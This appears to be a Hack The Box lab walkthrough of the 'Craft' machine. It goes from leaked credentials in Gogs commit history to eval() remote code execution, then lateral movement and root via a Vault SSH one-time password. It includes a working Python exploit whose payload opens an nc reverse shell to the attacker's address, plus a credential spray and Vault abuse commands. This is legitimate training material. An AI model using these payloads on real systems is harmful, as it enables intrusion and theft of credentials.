---
title: "Craft"
description: "Full compromise of the Craft machine was achieved through a chain of misconfigurations starting with a Gogs git repository exposed on a subdomain. Sensitive credentials were…"
date: 2026-05-04
platform: "Hack The Box"
os: "Windows"
difficulty: "Medium"
tags: ["walkthrough", "htb"]
---
**Target:** craft.htb 
**IP:** 10.129.39.91
**OS:** Linux (Debian) 
**Difficulty:** Medium 
**Platform:** HackTheBox
## Executive Summary

Full compromise of the Craft machine was achieved through a chain of misconfigurations starting with a **Gogs git repository** exposed on a subdomain. Sensitive credentials were discovered in **git commit history** that had been "cleaned up" but remained accessible in older commits. The API application used Python's `eval()` function unsafely, allowing **Remote Code Execution** via a crafted ABV value. From the Docker container, **MySQL database credentials** were extracted from the app config, revealing more user credentials. **Gilfoyle's private Gogs repository** contained his SSH private key, granting host access. Finally, a **HashiCorp Vault SSH secrets engine** was used to generate a one-time root password for full privilege escalation.

## Enumeration

### Nmap Scan

```bash

┌──(penguin㉿0X0F)-[~/CPTS/CPTS official Pathway/Crafty]
└─$ sudo nmap -sC 10.129.39.91 -p- -Pn -A -T4
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
443/tcp  open  ssl/http nginx 1.15.8
|_http-title: About
| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
| Not valid before: 2019-02-06T02:25:47
|_Not valid after:  2020-06-20T02:25:47
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.15.8
| tls-nextprotoneg: 
|_  http/1.1
| tls-alpn: 
|_  http/1.1
6022/tcp open  ssh      Golang x/crypto/ssh server (protocol 2.0)
| ssh-hostkey: 
|_  2048 5b:cc:bf:f1:a1:8f:72:b0:c0:fb:df:a3:01:dc:a6:fb (RSA)
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   95.08 ms 10.10.16.1
2   30.47 ms 10.129.39.91

```

| Port | Service       | Notes                   |
| ---- | ------------- | ----------------------- |
| 22   | OpenSSH 7.4p1 | Standard SSH            |
| 443  | nginx 1.15.8  | HTTPS - craft.htb       |
| 6022 | Golang SSH    | Non-standard SSH server |

### Passive Web Enumeration 

Browsing the site revealed a link to a Gogs instance. Added to `/etc/hosts`:

```
10.129.39.91  craft.htb gogs.craft.htb api.craft.htb
```


### Gogs  Source Code Review

![Image](../../assets/images/Pasted-image-20260505020340.png)

Found public repo: `Craft/craft-api` at `https://gogs.craft.htb`

**Key findings in the repo:**

- **Issues tab**  contained a leaked JWT token in a bug report
- **6 commits** commit history showed two users: `ebachman` and `dinesh`
- Commit `a2d28ed155`  "Cleanup test" by dinesh (suspicious cleanup = something was removed)
- Commit `10e3ba4f0a`  "add test script" by dinesh  the commit BEFORE cleanup

```Shell
curl -H 'X-Craft-API-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw' -H "Content-Type: application/json" -k -X POST https://api.craft.htb/api/brew/ --data '{"name":"bullshit","brewer":"bullshit", "style": "bullshit", "abv": "15.0")}'
```

**Hardcoded credentials found in commit `10e3ba4f0a` (`tests/test.py`):**

![Image](../../assets/images/Pasted-image-20260505021601.png)

Auth has been revealed from a past commit `dinesh:4aUh0A8PbVJxgd` 

>Always check ALL commits in a repo  developers often accidentally commit credentials then "clean" them in a later commit. The old commit still contains the secrets.

### ABV Eval Vulnerability

Commit `c414b16057`   "Add fix for bogus ABV values" revealed a dangerous code pattern in `craft_api/api/brew/endpoints/brew.py`:

User input is passed **directly into Python's `eval()`** - this is Remote Code Execution.
![Image](../../assets/images/Pasted-image-20260505022523.png)

## Foothold  RCE via eval()

### Getting a Valid JWT Token
```bash
┌──(penguin㉿0X0F)-[~/CPTS/CPTS official Pathway/Crafty/craft-api]
└─$ curl -k https://api.craft.htb/api/auth/login -u 'dinesh:4aUh0A8PbVJxgd'
{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNzc3OTI5ODQyfQ.GuHP8gjIWi_FA_TAdKxD8OoMffFR2nPkWTELAtBvROg"}
```

From this section ! its evident that the user input directly into eval function to compare .
Lets try to send a reverse shell setting up a script

### Exploiting eval() for Reverse Shell

Created `exploit.py` using `os.popen()` to execute a reverse shell payload

```Python
import requests
import json

response = requests.get('https://api.craft.htb/api/auth/login', auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)
token = json.loads(response.text)['token']

headers = {'X-Craft-API-Token': token, 'Content-Type': 'application/json'}

data = {
    "name": "test",
    "brewer": "test", 
    "style": "test",
    "abv": "__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.99 4444 >/tmp/f').read()"
}

response = requests.post('https://api.craft.htb/api/brew/', headers=headers, json=data, verify=False)
print(response.text)
```

>`os.system()` doesn't return output to us so I used `os.popen().read()` instead for payloads that need output, or for reverse shells where we just need execution.

`Terminal 1`
```bash
python3 exploit.py
```

**Shell received as `root` inside a Docker container** at `/opt/app`

`Terminal 2 `
```bash
┌──(penguin㉿0X0F)-[~/CPTS/CPTS official Pathway/Crafty]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.99] from (UNKNOWN) [10.129.39.91] 36967
/opt/app # whoami
root
/opt/app # 
```

### Docker Container Enumeration

#### Settings File - DB Credentials
```bash
/opt/app/craft_api # cat settings.py
# Flask settings
FLASK_SERVER_NAME = 'api.craft.htb'
FLASK_DEBUG = False  # Do not use debug mode in production

# Flask-Restplus settings
RESTPLUS_SWAGGER_UI_DOC_EXPANSION = 'list'
RESTPLUS_VALIDATE = True
RESTPLUS_MASK_SWAGGER = False
RESTPLUS_ERROR_404_HELP = False
CRAFT_API_SECRET = 'hz66OCkDtv8G6D'

# database
MYSQL_DATABASE_USER = 'craft'
MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
MYSQL_DATABASE_DB = 'craft'
MYSQL_DATABASE_HOST = 'db'
SQLALCHEMY_TRACK_MODIFICATIONS = False
/opt/app/craft_api # 
```

Credentials username `craft : qLGockJ6G2J75O`

#### Dumping the User Table
Modified `dbtest.py` to dump all users:

```Shell
python3 << 'EOF'
import pymysql
from craft_api import settings

connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
                             user=settings.MYSQL_DATABASE_USER,
                             password=settings.MYSQL_DATABASE_PASSWORD,
                             db=settings.MYSQL_DATABASE_DB,
                             cursorclass=pymysql.cursors.DictCursor)
try:
    with connection.cursor() as cursor:
        cursor.execute("SELECT * FROM user;")
        result = cursor.fetchall()
        print(result)
finally:
    connection.close()
EOF
```

| Username | Password         |
| -------- | ---------------- |
| dinesh   | `4aUh0A8PbVJxgd` |
| ebachman | `llJ77D8QFkLPQB` |
| gilfoyle | `ZEU3N8WNM2rh4T` |
## Lateral Movement  Gilfoyle's SSH Key

Password spray against SSH failed for all users. Logged into Gogs as `gilfoyle:ZEU3N8WNM2rh4T` and found a **private repository: `craft-infra`**.

```bash
┌──(penguin㉿0X0F)-[~/CPTS/CPTS official Pathway/Crafty]
└─$ nxc ssh craft.htb -u users.txt -p passwords.txt --continue-on-success
SSH         10.129.39.91    22     craft.htb        [*] SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u6
SSH         10.129.39.91    22     craft.htb        [-] dinesh:4aUh0A8PbVJxgd
SSH         10.129.39.91    22     craft.htb        [-] ebachman:4aUh0A8PbVJxgd
SSH         10.129.39.91    22     craft.htb        [-] gilfoyle:4aUh0A8PbVJxgd
SSH         10.129.39.91    22     craft.htb        [-] dinesh:llJ77D8QFkLPQB
SSH         10.129.39.91    22     craft.htb        [-] ebachman:llJ77D8QFkLPQB
SSH         10.129.39.91    22     craft.htb        [-] gilfoyle:llJ77D8QFkLPQB
SSH         10.129.39.91    22     craft.htb        [-] dinesh:ZEU3N8WNM2rh4T
SSH         10.129.39.91    22     craft.htb        [-] ebachman:ZEU3N8WNM2rh4T
SSH         10.129.39.91    22     craft.htb        [-] gilfoyle:ZEU3N8WNM2rh4T
```

Inside `craft-infra/.ssh/`:
- `id_rsa` - private SSH key
- `id_rsa.pub` -  public key

![Image](../../assets/images/Pasted-image-20260505024402.png)


### SSH Access as Gilfoyle
Lets save key  in our local system and try to access using ssh

```bash
┌──(penguin㉿0X0F)-[~/CPTS/CPTS official Pathway/Crafty]
└─$ ssh -i id_rsa gilfoyle@craft.htb
```

The key has passphrase which is `ZEU3N8WNM2rh4T` we can capture the flag

## Privilege Escalation HashiCorp Vault SSH OTP

### Vault Discovery
1. Repo name `craft-infra` suggested secrets management infrastructure
2. `ps aux` showed `vault server` running as root (PID 1008)
3. `~/.vault-token` existed in gilfoyle's home directory

```bash
gilfoyle@craft:~$ cat ~/.vault-token
f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9gilfoyle@craft:~$ 
gilfoyle@craft:~$ 
```

### Enumerating Vault

```bash
gilfoyle@craft:~$ export VAULT_TOKEN=f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
gilfoyle@craft:~$ export VAULT_ADDR=https://vault.craft.htb:8200
gilfoyle@craft:~$ 
```

```Shell
gilfoyle@craft:~$ vault list ssh/roles/
Keys
----
root_otp
gilfoyle@craft:~$ vault read ssh/roles/root_otp
Key                  Value
---                  -----
allowed_users        n/a
cidr_list            0.0.0.0/0
default_user         root
exclude_cidr_list    n/a
key_type             otp
port                 22
```

Found an **SSH OTP secrets engine** with a `root_otp` role configured for `default_user: root`.

### Generating a Root OTP

```bash
gilfoyle@craft:~$ vault write ssh/creds/root_otp ip=127.0.0.1
Key                Value
---                -----
lease_id           ssh/creds/root_otp/d5fcb4ea-3ed8-5def-0cd9-7d694a67c2ce
lease_duration     768h
lease_renewable    false
ip                 127.0.0.1
key                4fbb168a-4e5c-1a47-929e-66c4e2592aca
key_type           otp
port               22
username           root
gilfoyle@craft:~$ 
```

### SSH as Root
```bash
gilfoyle@craft:~$ ssh root@127.0.0.1
```

then logging using  `4fbb168a-4e5c-1a47-929e-66c4e2592aca`

```bash
root@craft:~# whoami
root
root@craft:~# id
uid=0(root) gid=0(root) groups=0(root)
root@craft:~# 
```

## Attack Chain Summary

```
[Gogs Repo - Public]
    └─> Issues tab leaked JWT token (expired but reveals API structure)
        └─> Commit history inspection
            └─> Old commit 10e3ba4f0a had hardcoded creds
                └─> dinesh : 4aUh0A8PbVJxgd

[API - eval() RCE]
    └─> ABV field passed directly into Python eval()
        └─> os.popen() reverse shell payload
            └─> Docker container shell as root

[Docker Container]
    └─> settings.py - MySQL credentials
        └─> DB dump - 3 user credentials
            └─> gilfoyle : ZEU3N8WNM2rh4T

[Gogs - Private Repo]
    └─> Logged in as gilfoyle
        └─> craft-infra repo - .ssh/id_rsa
            └─> SSH as gilfoyle (passphrase = DB password)
                └─> user.txt 

[HashiCorp Vault]
    └─> vault server running (ps aux)
        └─> ~/.vault-token found
            └─> SSH OTP secrets engine
                └─> vault write ssh/creds/root_otp ip=127.0.0.1
                    └─> SSH as root
                        └─> root.txt 
```

## Key Concepts & Techniques

- **Git Commit History Review** - Always check ALL commits, not just current code. Cleaned-up secrets still exist in old commits
- **Python eval() Injection** - Never pass user input into `eval()`. Use `os.popen()` over `os.system()` when output or execution is needed
- **Docker Container Enumeration** - Check config files, env vars and `dbtest.py`-style scripts for credentials
- **Gogs Private Repositories**  Authenticated access to Gogs may reveal private repos with keys/configs not visible anonymously
- **HashiCorp Vault SSH OTP** _ Vault's SSH secrets engine can issue one-time passwords to SSH as privileged users
- **ps aux as an enumeration tool** _ Running processes reveal what services exist on the host even without direct access